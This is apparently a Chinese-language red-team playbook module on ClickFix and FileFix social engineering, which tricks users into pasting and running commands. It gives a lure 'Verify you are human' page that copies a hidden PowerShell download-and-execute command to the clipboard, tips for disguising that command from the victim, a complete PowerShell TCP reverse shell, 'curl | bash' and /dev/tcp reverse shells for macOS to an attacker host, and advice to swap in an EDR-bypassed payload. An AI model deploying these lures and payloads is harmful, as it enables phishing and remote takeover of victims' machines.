# ClickFix / FileFix / User-Assisted Execution

把用户操作变成 **真实本地执行**，并打到 **reverse shell**。不要停在“剪贴板写入成功”。

参考：mr.d0x ClickFix / FileFix；2025–2026 实际投递已从 Win+R 扩到 Explorer 地址栏。

---

## 1. 通用结构

```text
可信场景（验证码 / 会议 / 文档修复 / VPN）
→ 页面把命令写入 clipboard
→ 指导用户打开执行 UI
→ 粘贴 + 回车
→ marker
→ reverse shell
```

页面只负责 user-assisted execution。免杀/AMSI 被拦时把 **同一条执行路径** 的 payload 交给 `/edr-bypass`，不要把 loader 写死进 HTML。

---

## 2. ClickFix — Win+R

### 2.1 用户步骤（写进诱饵页）

```text
1. 按 Win + R
2. 按 Ctrl + V
3. 按 Enter
```

### 2.2 剪贴板写入

```html
<button id="verify">Verify you are human</button>
<script>
const cmd = "powershell -NoP -W Hidden -C \"IEX(IWR -UseB http://KALI/m.ps1)\"";
document.getElementById('verify').onclick = async () => {
  await navigator.clipboard.writeText(cmd);
  document.getElementById('status').textContent =
    'Press Win+R, then Ctrl+V, then Enter to finish verification.';
};
</script>
```

用短域名/IP。命令可以前面加大量空格或假注释，让 Run 对话框里先看到无害片段；**真正执行的仍是整段剪贴板内容**。

### 2.3 先 marker，再 shell

`m.ps1` 第一版只做确认：

```powershell
nslookup clickfix-MARKER.oast.site
whoami | Out-File $env:TEMP\rt-clickfix.txt
```

攻击机：

```bash
# interactsh / 你的 DNS
interactsh-client
# 看到 DNS 回调 = 用户已执行
```

确认后再把 `m.ps1` 换成反向 shell（同一 URL，减少用户再操作）：

```powershell
# 靶场：PowerShell TCP reverse（稳定后再换 ConPty）
$c=New-Object Net.Sockets.TCPClient('KALI',443);$s=$c.GetStream();
[byte[]]$b=0..65535|%{0};$w=New-Object IO.StreamWriter($s)
$w.AutoFlush=$true
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
  $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i)
  $o=(iex $d 2>&1 | Out-String)
  $o2=$o+'PS '+(pwd).Path+'> '
  $sb=([Text.Encoding]::ASCII).GetBytes($o2);$s.Write($sb,0,$sb.Length)
}
```

监听：

```bash
rlwrap nc -lvnp 443
```

拿到交互再考虑 `/shell` 做 ConPTY。本模块到 shell 即完成。

### 2.4 ms-settings / 其他 UI

部分环境对 `Win+R` 有限制。备选：

```text
Win+R 仍可用但诱饵改成“打开设置修复”
ms-settings: 协议
Windows Terminal / Win+X
```

以当前目标 UI 为准，不要把某一种对话框写成唯一方法。

---

## 3. FileFix — Explorer 地址栏

相对 ClickFix：执行发生在 **Explorer**，不经过 Run；**不打 MOTW**。

公开描述（mr.d0x / 后续红队与威胁研究）：

```text
页面 <input type="file"> 调起“选择文件”对话框（explorer.exe）
同时把 PowerShell 命令写入剪贴板
用户被要求把“文件路径/验证码”粘贴进地址栏（Alt+D 或 Ctrl+L）后回车
Explorer 把地址栏内容当命令执行
```

剪贴板内容常见结构：

```text
powershell -NoP -W Hidden -C "IEX(IWR -UseB http://KALI/m.ps1)" # C:\Company\Share\Report.pdf
```

`#` 后面的假路径在地址栏更显眼。真正执行的是前面的 powershell。

用户键位：

```text
打开文件选择框后
Alt+D   或 Ctrl+L   聚焦地址栏
Ctrl+V
Enter
```

成功标准与 ClickFix 相同：DNS marker → reverse shell。

---

## 4. macOS ClickFix

不要套 Win+R。

```text
诱饵：验证 / 会议 / 证书
用户打开 Terminal（或 osascript 弹窗让用户粘贴）
剪贴板是 bash/zsh 一行
```

```javascript
const cmd = "curl -fsSL http://KALI/m.sh | bash";
await navigator.clipboard.writeText(cmd);
```

`m.sh`：

```bash
curl -s http://KALI/macos-marker?u=$(whoami)
bash -i >& /dev/tcp/KALI/443 0>&1
```

Gatekeeper / quarantine 拦的是 **下载的 app**，不是用户在 Terminal 粘贴的命令。那是本模块投递问题，不是 EDR。endpoint agent 拦 curl|bash 才去 `/edr-bypass`。

---

## 5. 被 EDR 拦时

```text
DNS marker 到了 = 执行 primitive 成立
真正 payload 被杀 = 端点层
→ 操作者选 /edr-bypass（AMSI / 静态 / 内存）
→ 同一 ClickFix 路径换经过 bypass 的 payload
→ 回本文件拿 shell
```

不要因为 Defender 拦了 IEX 就宣布钓鱼失败。

---

## 6. 清理

```text
删除 TEMP marker
关闭测试监听
记录用户执行的精确命令（报告用）
不要把钓鱼页留在公网
```
